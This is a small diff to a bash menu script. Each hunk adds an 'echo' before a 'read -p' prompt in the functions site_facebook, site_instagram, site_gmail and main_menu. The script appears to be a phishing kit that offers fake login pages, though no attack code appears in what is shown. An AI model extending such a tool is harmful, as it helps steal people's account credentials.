@@ -475,6 +475,7 @@ about() {
 
 	EOF
 
+	echo
 	read -p "${MAGENTA}Select an option:"
 	case $REPLY in 
 		99)
@@ -801,6 +802,7 @@ site_facebook() {
 
 	EOF
 
+	echo
 	read -p "${MAGENTA}Select an option:"
 
 	case $REPLY in 
@@ -837,6 +839,7 @@ site_instagram() {
 
 	EOF
 
+	echo
 	read -p "${MAGENTA}Select an option:"
 
 	case $REPLY in 
@@ -872,6 +875,7 @@ site_gmail() {
 
 	EOF
 
+	echo
 	read -p "${MAGENTA}Select an option:"
 
 	case $REPLY in 
@@ -912,7 +916,8 @@ main_menu() {
 
 		${BRIGHT_CYAN}99. About         ${BRIGHT_CYAN}0. Exit
 	EOF
-	
+
+	echo
 	read -p "${MAGENTA}Select an option:"
 
 	case $REPLY in 
